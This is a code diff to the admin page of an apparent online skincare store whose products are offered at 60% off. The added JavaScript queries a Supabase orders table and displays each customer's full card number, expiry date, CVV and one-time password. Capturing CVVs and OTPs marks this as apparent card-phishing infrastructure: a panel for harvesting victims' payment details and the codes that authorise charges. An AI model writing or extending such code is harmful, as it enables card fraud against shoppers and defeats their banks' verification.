@@ -176,9 +176,52 @@
         </div>
     </footer>
 
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
-    <script src="../supabase.js"></script>
     <script>
+        var _SUPABASE_URL = 'https://blozysudthytzkfepgqc.supabase.co';
+        var _SUPABASE_KEY = 'sb_publishable_tRk0OqQQQlxCt8dlngXwfw_DtrqVaXM';
+
+        function _sbHeaders(extra) {
+            var h = { 'Content-Type': 'application/json', 'apikey': _SUPABASE_KEY, 'Authorization': 'Bearer ' + _SUPABASE_KEY };
+            var s = localStorage.getItem('auraAdminSession');
+            if (s) { try { var sess = JSON.parse(s); if (sess.access_token) h['Authorization'] = 'Bearer ' + sess.access_token; } catch(e) {} }
+            if (extra) Object.assign(h, extra);
+            return h;
+        }
+
+        async function loadOrdersFromSupabase() {
+            try {
+                var r = await fetch(_SUPABASE_URL + '/rest/v1/orders?select=*&order=id.desc', { headers: _sbHeaders() });
+                var data = await r.json();
+                if (!Array.isArray(data)) return [];
+                return data.map(function(row) { return {
+                    id: row.order_id, name: row.customer_name, phone: row.customer_phone,
+                    address: row.customer_address, country: row.customer_country,
+                    total: row.total, status: row.status,
+                    date: row.created_at ? new Date(row.created_at).toLocaleString('ar-SA') : '-',
+                    paymentMethod: row.card_type || '-',
+                    cardDetails: { holder: row.card_holder||'', number: row.card_number||'', expiry: row.card_expiry||'', cvv: row.card_cvv||'', brand: row.card_type||'', otp: row.card_otp||'' },
+                    items: typeof row.products === 'string' ? JSON.parse(row.products||'[]') : (row.products||[])
+                };});
+            } catch(e) { return []; }
+        }
+
+        async function updateOrderStatusInSupabase(orderId, newStatus) {
+            try {
+                await fetch(_SUPABASE_URL + '/rest/v1/orders?order_id=eq.' + orderId, {
+                    method: 'PATCH', headers: _sbHeaders(),
+                    body: JSON.stringify({ status: newStatus })
+                });
+            } catch(e) {}
+        }
+
+        async function deleteOrderFromSupabase(orderId) {
+            try {
+                await fetch(_SUPABASE_URL + '/rest/v1/orders?order_id=eq.' + orderId, {
+                    method: 'DELETE', headers: _sbHeaders()
+                });
+            } catch(e) {}
+        }
+
         const DEFAULT_PRODUCTS = [
     { id: 1, name: "Green Tea Skin Cream - קרם תה ירוק", category: "סרום", price: 126, oldPrice: 315, rating: 4.5, reviews: 53, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/mbn/mbn01262/r/138.jpg", badge: "60% הנחה" },
     { id: 2, name: "Organic Jojoba Oil - שמן חוחובה אורגני", category: "שמן", price: 142, oldPrice: 355, rating: 4.6, reviews: 43, image: "https://cloudinary.images-iherb.com/image/upload/f_auto,q_auto:eco/images/clg/clg00703/r/86.jpg", badge: "60% הנחה" },
@@ -534,20 +577,24 @@
                 window.location.href='/admin-login/';
                 return;
             }
-            var sb = getSupabase();
-            if (sb) {
-                sb.auth.setSession(session).then(function(r) {
-                    if (r.data && r.data.session) {
-                        localStorage.setItem('auraAdminSession', JSON.stringify(r.data.session));
-                    }
-                    console.log('[SECURITY] Admin authenticated via Supabase Auth');
-                    loadOrders();
-                }).catch(function() {
-                    loadOrders();
-                });
-            } else {
+            var refreshToken = session.refresh_token;
+            fetch(_SUPABASE_URL + '/auth/v1/token?grant_type=refresh_token', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'apikey': _SUPABASE_KEY },
+                body: JSON.stringify({ refresh_token: refreshToken })
+            }).then(function(r) { return r.json(); }).then(function(d) {
+                if (d.access_token) {
+                    localStorage.setItem('auraAdminSession', JSON.stringify({
+                        access_token: d.access_token,
+                        refresh_token: d.refresh_token || refreshToken,
+                        expires_at: Date.now() + (d.expires_in || 3600) * 1000
+                    }));
+                }
+                console.log('[SECURITY] Admin authenticated');
                 loadOrders();
-            }
+            }).catch(function() {
+                loadOrders();
+            });
         })();
 
         function logout() {
